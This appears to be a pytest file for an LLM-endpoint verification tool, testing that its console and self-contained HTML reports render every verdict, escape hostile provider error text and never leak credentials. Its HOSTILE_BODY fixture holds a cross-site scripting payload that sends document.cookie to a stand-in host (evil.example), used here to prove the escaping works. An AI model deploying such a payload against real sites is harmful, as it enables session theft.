"""Console and HTML rendering, for every verdict and for hostile input.

The HTML document is the artefact somebody attaches to a procurement dispute, so
two of its properties are tested as hard as the arithmetic elsewhere: it must
reference nothing outside itself -- no CDN, no font, no remote image, no script
-- and it must escape everything it interpolates. A provider error body is
evidence and is reproduced verbatim by design, which means a provider that
returns ``<script>`` in an error message would otherwise get it executed in a
reader's browser.
"""

from __future__ import annotations

import datetime as dt
import io
import re
from html.parser import HTMLParser
from pathlib import Path

import pytest
from rich.console import Console

from llmverify.errors import ProviderError
from llmverify.evidence import (
    DECISIVE,
    MODERATE,
    STRONG,
    Evidence,
    EvidenceStatus,
    Verdict,
    aggregate,
)
from llmverify.report import (
    ConsoleReporter,
    render_comparison,
    render_comparison_html,
    render_html,
    render_result,
    write_html,
)
from llmverify.results import ProbeTiming, RunResult
from llmverify.runner import ProgressEvent, ProgressState

#: What a provider might put in an error body. It reaches the report verbatim
#: because it is evidence; it must never reach the browser as markup.
HOSTILE_BODY = (
    '<script>fetch("https://evil.example/steal?k="+document.cookie)</script>'
    "<img src=x onerror=alert(1)> & \"quoted\" 'single'"
)

#: Elements that carry no closing tag, so a balance check must not expect one.
VOID_ELEMENTS = frozenset(
    {"area", "base", "br", "col", "embed", "hr", "img", "input", "link", "meta",
     "param", "source", "track", "wbr"}
)


class _Balance(HTMLParser):
    """Checks that every element that opens is closed, in order."""

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.stack: list[str] = []
        self.errors: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag not in VOID_ELEMENTS:
            self.stack.append(tag)

    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        return

    def handle_endtag(self, tag: str) -> None:
        if tag in VOID_ELEMENTS:
            return
        if not self.stack:
            self.errors.append(f"</{tag}> with nothing open")
        elif self.stack[-1] != tag:
            self.errors.append(f"</{tag}> closes <{self.stack[-1]}>")
            self.stack.pop()
        else:
            self.stack.pop()


def assert_well_formed(document: str) -> None:
    parser = _Balance()
    parser.feed(document)
    parser.close()
    assert parser.errors == [], parser.errors
    assert parser.stack == [], f"unclosed: {parser.stack}"


def evidence(
    probe: str,
    label: str,
    llr: float,
    *,
    family: str = "misc",
    status: EvidenceStatus = EvidenceStatus.OK,
    detail: str = "a finding",
    data: dict | None = None,
) -> Evidence:
    return Evidence(
        probe=probe,
        label=label,
        llr=llr,
        cap=DECISIVE,
        family=family,
        status=status,
        detail=detail,
        data=data or {},
        cost_usd=0.001,
        tokens=120,
        duration_s=0.4,
    )


def make_result(verdict: Verdict, *, warnings: list[str] | None = None) -> RunResult:
    """A run whose aggregated verdict is ``verdict``, built from real evidence."""
    weights = {
        Verdict.MATCH: 6.0,
        Verdict.LIKELY_MATCH: 0.9,
        Verdict.INCONCLUSIVE: 0.0,
        Verdict.LIKELY_MISMATCH: -0.9,
        Verdict.MISMATCH: -6.0,
        Verdict.DEGRADED: 1.5,
        Verdict.EVASION: 0.0,
    }[verdict]
    items = [
        evidence("metadata", "model_echo", weights, family="metadata"),
        evidence("token_accounting", "tool_system_prompt", weights, family="token_accounting"),
        evidence(
            "benchmark",
            "mock_accuracy",
            weights,
            family="benchmark",
            data={
                "benchmark": "simpleqa_verified",
                "n_graded": 40,
                "successes": 31,
                "observed_accuracy_pp": 77.5,
                "wilson_95_pp": [62.5, 87.7],
                "reference_score_used_pp": 71.6,
                "reference_source": "Epoch AI",
                "reference_as_of": "2026-07-24",
                "reference_confidence": "independent",
                "reference_effort": "high",
                "provider_effort": "high",
                "tolerance_allowance_pp": 0.0,
                "sprt_llr_nats": -3.1,
                "sprt_upper_bound": 4.55,
                "sprt_lower_bound": -2.98,
                "sprt_decision": "accept_h0",
                "alpha": 0.01,
                "beta": 0.05,
                "null_accuracy": 0.716,
                "alternative_accuracy": 0.636,
            },
        ),
        evidence(
            "vision",
            "image_understanding",
            0.0,
            family="vision",
            status=EvidenceStatus.UNSUPPORTED,
            detail="the endpoint refused an image, and the claimed model takes images",
        ),
        evidence(
            "logprobs",
            "distribution",
            0.0,
            family="distribution",
            status=EvidenceStatus.ERROR,
            detail=f"the endpoint returned an error body: {HOSTILE_BODY}",
            data={"body": HOSTILE_BODY},
        ),
    ]
    if verdict is Verdict.DEGRADED:
        # Not a weight: DEGRADED is reached only through adverse evidence from a
        # serving-integrity family, so the fixture has to produce one.
        items.append(
            evidence(
                "long_context",
                "effective_window",
                -MODERATE,
                family="long_context",
                detail="retrieval succeeded to 4,000 tokens against 1,000,000 advertised",
            )
        )
    if verdict is Verdict.EVASION:
        items.append(
            evidence(
                "evasion",
                "variant_accuracy_gap",
                -DECISIVE,
                family="evasion",
                detail="verbatim 30/30 against paraphrased 2/30, a gap of 93.3 points",
            )
        )

    report = aggregate(items)
    assert report.verdict is verdict, f"fixture produced {report.verdict}, wanted {verdict}"

    started = dt.datetime(2026, 7, 26, 9, 0, tzinfo=dt.timezone.utc)
    return RunResult(
        provider_name="acme <inc> & co",
        requested_model="acme/opus5",
        claimed_model="claude-opus-5",
        api_family="openai",
        base_url="https://user:secret@api.example.com:8443/v1",
        verdict=report,
        started_at=started,
        finished_at=started + dt.timedelta(seconds=42),
        reference_as_of=dt.date(2026, 7, 26),
        reference_found=True,
        timings=[
            ProbeTiming("metadata", 0, 0.4, 1, "ok"),
            ProbeTiming("token_accounting", 1, 1.2, 6, "ok"),
            ProbeTiming("benchmark", 3, 30.0, 40, "ok"),
            ProbeTiming("vision", 2, 0.2, 1, "unsupported"),
            ProbeTiming("logprobs", 3, 0.1, 1, "error", HOSTILE_BODY),
        ],
        spent_usd=0.0731,
        input_tokens=51_234,
        output_tokens=4_120,
        samples=49,
        seed=20260726,
        layers=(0, 1, 2, 3),
        warnings=warnings or [],
    )


ALL_VERDICTS = list(Verdict)


# --------------------------------------------------------------------------- #
# Console
# --------------------------------------------------------------------------- #


def reporter(**kwargs: object) -> tuple[ConsoleReporter, io.StringIO]:
    buffer = io.StringIO()
    console = Console(file=buffer, width=110, no_color=True, force_terminal=False)
    return ConsoleReporter(console, **kwargs), buffer  # type: ignore[arg-type]


@pytest.mark.parametrize("verdict", ALL_VERDICTS)
def test_console_rendering_does_not_raise_for_any_verdict(verdict: Verdict) -> None:
    console, buffer = reporter()
    console.render(make_result(verdict, warnings=["the snapshot is 40 days old"]))
    out = buffer.getvalue()
    assert verdict.value in out
    assert "P(endpoint serves the claimed model)" in out


@pytest.mark.parametrize("verdict", ALL_VERDICTS)
def test_verbose_console_rendering_does_not_raise_for_any_verdict(verdict: Verdict) -> None:
    console, buffer = reporter(verbose=True)
    console.render(make_result(verdict))
    assert "sprt_decision" in buffer.getvalue()


def test_quiet_rendering_keeps_only_the_verdict_and_the_warnings() -> None:
    console, buffer = reporter(quiet=True)
    console.render(make_result(Verdict.MISMATCH, warnings=["read this"]))
    out = buffer.getvalue()
    assert "MISMATCH" in out
    assert "read this" in out
    assert "evidence by family" not in out


def test_the_console_never_prints_a_credential_from_a_base_url() -> None:
    """``urlsplit().hostname`` drops ``user:password@``, and that is the point."""
    console, buffer = reporter()
    console.render(make_result(Verdict.MATCH))
    out = buffer.getvalue()
    assert "secret" not in out
    assert "api.example.com:8443" in out


def test_an_adverse_verdict_says_what_would_strengthen_it() -> None:
    console, buffer = reporter()
    console.render(make_result(Verdict.MISMATCH))
    out = buffer.getvalue()
    assert "what would strengthen this" in out
    assert "vision" in out


def test_the_evasion_verdict_is_rendered_off_the_match_axis() -> None:
    console, buffer = reporter()
    console.render(make_result(Verdict.EVASION))
    out = buffer.getvalue()
    assert "EVASION" in out
    assert "conditions the provider chose" in out


def test_comparison_rendering_ranks_by_verdict() -> None:
    console, buffer = reporter()
    console.render_comparison(
        [make_result(Verdict.MISMATCH), make_result(Verdict.MATCH)]
    )
    out = buffer.getvalue()
    assert out.index("MATCH") < out.index("MISMATCH")


def test_comparison_rendering_survives_an_empty_list() -> None:
    console, buffer = reporter()
    console.render_comparison([])
    assert "no runs to compare" in buffer.getvalue()


def test_error_rendering_includes_a_provider_body() -> None:
    console, buffer = reporter()
    console.render_error(ProviderError("refused", status=400, body=HOSTILE_BODY))
    out = buffer.getvalue()
    assert "ProviderError" in out
    assert "HTTP status: 400" in out


def test_the_progress_callback_survives_every_state() -> None:
    """The runner emits these; a reporter that raises would abort a whole run."""
    console, buffer = reporter()
    callback = console.progress_callback()
    for state in ProgressState:
        callback(
            ProgressEvent(
                probe="benchmark",
                layer=3,
                state=state,
                elapsed_s=12.5,
                message="40 items graded",
                provider="acme",
            )
        )
    assert "benchmark" in buffer.getvalue()


def test_a_quiet_reporter_emits_no_progress() -> None:
    console, buffer = reporter(quiet=True)
    console.progress_callback()(
        ProgressEvent(probe="metadata", layer=0, state=ProgressState.FINISHED, elapsed_s=1.0)
    )
    assert buffer.getvalue() == ""


def test_module_level_hooks_are_the_ones_the_cli_looks_for() -> None:
    buffer = io.StringIO()
    console = Console(file=buffer, width=110, no_color=True)
    render_result(make_result(Verdict.MATCH), console=console, verbose=False)
    render_comparison([make_result(Verdict.MATCH)], console=console)
    assert "MATCH" in buffer.getvalue()


# --------------------------------------------------------------------------- #
# HTML
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize("verdict", ALL_VERDICTS)
def test_html_is_well_formed_for_any_verdict(verdict: Verdict, tmp_path: Path) -> None:
    path = render_html(make_result(verdict), path=tmp_path / f"{verdict.value}.html")
    document = path.read_text(encoding="utf-8")
    assert document.lstrip().lower().startswith("<!doctype html")
    assert verdict.value in document
    assert_well_formed(document)


def test_html_references_nothing_outside_itself(tmp_path: Path) -> None:
    """No CDN, no web font, no remote image, no script of any kind."""
    document = render_html(make_result(Verdict.MISMATCH), path=tmp_path / "r.html").read_text(
        encoding="utf-8"
    )
    assert "<script" not in document.lower()
    assert "@import" not in document
    for pattern in (
        r"<link\b",
        r"<iframe\b",
        r"<img\b",
        r"<object\b",
        r"<embed\b",
        r"src\s*=\s*[\"']https?:",
        r"src\s*=\s*[\"']//",
        r"href\s*=\s*[\"']https?:",
        r"url\(\s*[\"']?https?:",
        r"url\(\s*[\"']?//",
    ):
        assert re.search(pattern, document, re.IGNORECASE) is None, pattern


def test_html_escapes_a_provider_error_body_carrying_a_script_tag(tmp_path: Path) -> None:
    document = render_html(make_result(Verdict.MISMATCH), path=tmp_path / "r.html").read_text(
        encoding="utf-8"
    )
    # The body is evidence and must be readable...
    assert "evil.example" in document
    assert "document.cookie" in document
    # ...but only as text.
    assert "<script>" not in document
    assert "&lt;script&gt;" in document
    assert "<img src=x" not in document
    assert "&lt;img src=x onerror=alert(1)&gt;" in document
    assert "&amp;" in document


def test_html_does_not_leak_a_credential_from_the_base_url(tmp_path: Path) -> None:
    document = render_html(make_result(Verdict.MATCH), path=tmp_path / "r.html").read_text(
        encoding="utf-8"
    )
    assert "secret" not in document
    assert "api.example.com" in document


def test_html_carries_the_limits_statement(tmp_path: Path) -> None:
    """An adverse verdict must never be presented as proof of fraud."""
    document = render_html(make_result(Verdict.MISMATCH), path=tmp_path / "r.html").read_text(
        encoding="utf-8"
    )
    assert "hardware attestation" in document
    assert "not proof" in document


def test_html_shows_the_evidence_and_the_family_totals(tmp_path: Path) -> None:
    document = render_html(make_result(Verdict.MATCH), path=tmp_path / "r.html").read_text(
        encoding="utf-8"
    )
    for token in ("model_echo", "tool_system_prompt", "token_accounting", "ban"):
        assert token in document
    # Charts are hand-written SVG, and every one has its numbers beside it.
    assert "<svg" in document
    assert "simpleqa_verified" in document


def test_comparison_html_is_well_formed_and_self_contained(tmp_path: Path) -> None:
    path = render_comparison_html(
        [make_result(Verdict.MATCH), make_result(Verdict.EVASION)],
        path=tmp_path / "compare.html",
    )
    document = path.read_text(encoding="utf-8")
    assert_well_formed(document)
    assert "<script" not in document.lower()
    assert "MATCH" in document and "EVASION" in document


def test_write_html_picks_the_document_the_run_count_calls_for(tmp_path: Path) -> None:
    single = write_html([make_result(Verdict.MATCH)], tmp_path / "one.html")
    several = write_html(
        [make_result(Verdict.MATCH), make_result(Verdict.MISMATCH)], tmp_path / "many.html"
    )
    assert "claude-opus-5" in single.read_text(encoding="utf-8")
    assert_well_formed(several.read_text(encoding="utf-8"))
    with pytest.raises(ValueError):
        write_html([], tmp_path / "none.html")


def test_html_creates_its_parent_directory(tmp_path: Path) -> None:
    path = render_html(make_result(Verdict.MATCH), path=tmp_path / "nested" / "deep" / "r.html")
    assert path.is_file()


# --------------------------------------------------------------------------- #
# Serialisation
# --------------------------------------------------------------------------- #


def test_the_json_result_is_secret_free_and_stable() -> None:
    payload = make_result(Verdict.MISMATCH).to_dict()
    assert payload["schema_version"] == 1
    assert payload["verdict"]["value"] == "MISMATCH"
    assert payload["provider"]["claimed_model"] == "claude-opus-5"
    assert len(payload["evidence"]) == 5
    assert payload["budget"]["input_tokens"] == 51_234
    # Every free-text field has been through redact() on the way out.
    assert "sk-" not in str(payload)
    assert payload["timings"][4]["error"] == HOSTILE_BODY


def test_evidence_status_and_family_totals_survive_serialisation() -> None:
    payload = make_result(Verdict.EVASION).to_dict()
    statuses = {item["status"] for item in payload["evidence"]}
    assert {"ok", "unsupported", "error"} <= statuses
    assert "evasion" in payload["verdict"]["family_totals"]
    assert payload["verdict"]["notes"]


def test_named_llr_magnitudes_are_available_to_report_builders() -> None:
    assert MODERATE < STRONG < DECISIVE
